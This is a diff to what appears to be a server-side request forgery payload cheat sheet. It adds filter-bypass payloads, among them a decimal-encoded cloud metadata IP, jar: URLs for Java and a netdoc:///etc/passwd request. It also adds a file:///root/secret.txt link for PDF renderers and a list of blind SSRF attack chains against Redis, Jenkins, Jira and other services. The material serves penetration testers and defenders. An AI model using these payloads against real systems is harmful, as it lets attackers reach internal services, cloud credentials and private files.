@@ -21,6 +21,7 @@
   * [Bypass using enclosed alphanumerics](#bypass-using-enclosed-alphanumerics)
   * [Bypass filter_var() php function](#bypass-filter_var-php-function)
   * [Bypass against a weak parser](#bypass-against-a-weak-parser)
+  * [Bypassing using jar protocol (java only)](#bypassing-using-jar-protocol-java-only)
 * [SSRF exploitation via URL Scheme](#ssrf-exploitation-via-url-scheme)
   * [file://](#file)
   * [http://](#http)
@@ -32,6 +33,8 @@
   * [netdoc://](#netdoc)
 * [SSRF exploiting WSGI](#ssrf-exploiting-wsgi)
 * [SSRF exploiting Redis](#ssrf-exploiting-redis)
+* [SSRF exploiting PDF file](#ssrf-exploiting-pdf-file)
+* [Blind SSRF](#blind-ssrf)
 * [SSRF to XSS](#ssrf-to-xss)
 * [SSRF from XSS](#ssrf-from-xss)
 * [SSRF URL for Cloud Instances](#ssrf-url-for-cloud-instances)
@@ -137,6 +140,7 @@ http://0177.0.0.1/
 http://2130706433/ = http://127.0.0.1
 http://3232235521/ = http://192.168.0.1
 http://3232235777/ = http://192.168.1.1
+http://2852039166/  = http://169.254.169.254
 ```
 
 ### Bypass using IPv6/IPv4 Address Embedding
@@ -244,6 +248,17 @@ Using this vulnerability users can upload images from any image URL = trigger an
 Create a domain that change between two IPs. http://1u.ms/ exists for this purpose.
 For example to rotate between 1.2.3.4 and 169.254-169.254, use the following domain:
 make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
+```
+
+### Bypassing using jar protocol (java only)
+
+Blind SSRF
+
+```powershell
+jar:scheme://domain/path!/ 
+jar:http://127.0.0.1!/
+jar:https://127.0.0.1!/
+jar:ftp://127.0.0.1!/
 ```
 
 ## SSRF exploitation via URL Scheme
@@ -373,8 +388,8 @@ Content of evil.com/redirect.php:
 Wrapper for Java when your payloads struggle with "\n" and "\r" characters.
 
 ```powershell
-ssrf.php?url=gopher://127.0.0.1:4242/DATA
-```
+ssrf.php?url=netdoc:///etc/passwd
+``` 
 
 ## SSRF exploiting WSGI
 
@@ -423,6 +438,40 @@ Example with [WeasyPrint by @nahamsec](https://www.youtube.com/watch?v=t5fB6OZsR
 ```powershell
 <link rel=attachment href="file:///root/secret.txt">
 ```
+
+## Blind SSRF
+
+> When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read. 
+
+Use an SSRF chain to gain an Out-of-Band output.
+
+From https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/ / https://github.com/assetnote/blind-ssrf-chains
+
+**Possible via HTTP(s)**
+- [Elasticsearch](https://github.com/assetnote/blind-ssrf-chains#elasticsearch)
+- [Weblogic](https://github.com/assetnote/blind-ssrf-chains#weblogic)
+- [Hashicorp Consul](https://github.com/assetnote/blind-ssrf-chains#consul)
+- [Shellshock](https://github.com/assetnote/blind-ssrf-chains#shellshock)
+- [Apache Druid](https://github.com/assetnote/blind-ssrf-chains#druid)
+- [Apache Solr](https://github.com/assetnote/blind-ssrf-chains#solr)
+- [PeopleSoft](https://github.com/assetnote/blind-ssrf-chains#peoplesoft)
+- [Apache Struts](https://github.com/assetnote/blind-ssrf-chains#struts)
+- [JBoss](https://github.com/assetnote/blind-ssrf-chains#jboss)
+- [Confluence](https://github.com/assetnote/blind-ssrf-chains#confluence)
+- [Jira](https://github.com/assetnote/blind-ssrf-chains#jira)
+- [Other Atlassian Products](https://github.com/assetnote/blind-ssrf-chains#atlassian-products)
+- [OpenTSDB](https://github.com/assetnote/blind-ssrf-chains#opentsdb)
+- [Jenkins](https://github.com/assetnote/blind-ssrf-chains#jenkins)
+- [Hystrix Dashboard](https://github.com/assetnote/blind-ssrf-chains#hystrix)
+- [W3 Total Cache](https://github.com/assetnote/blind-ssrf-chains#w3)
+- [Docker](https://github.com/assetnote/blind-ssrf-chains#docker)
+- [Gitlab Prometheus Redis Exporter](https://github.com/assetnote/blind-ssrf-chains#redisexporter)
+
+**Possible via Gopher**
+- [Redis](https://github.com/assetnote/blind-ssrf-chains#redis)
+- [Memcache](https://github.com/assetnote/blind-ssrf-chains#memcache)
+- [Apache Tomcat](https://github.com/assetnote/blind-ssrf-chains#tomcat)
+
 
 ## SSRF to XSS 
 
@@ -768,3 +817,4 @@ More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-se
 - [SVG SSRF Cheatsheet - Allan Wirth (@allanlw) - 12/06/2019](https://github.com/allanlw/svg-cheatsheet)
 - [SSRF’s up! Real World Server-Side Request Forgery (SSRF) - shorebreaksecurity - 2019](https://www.shorebreaksecurity.com/blog/ssrfs-up-real-world-server-side-request-forgery-ssrf/)
 - [challenge 1: COME OUT, COME OUT, WHEREVER YOU ARE!](https://www.kieranclaessens.be/cscbe-web-2018.html)
+- [Attacking Url's in JAVA](https://blog.pwnl0rd.me/post/lfi-netdoc-file-java/)
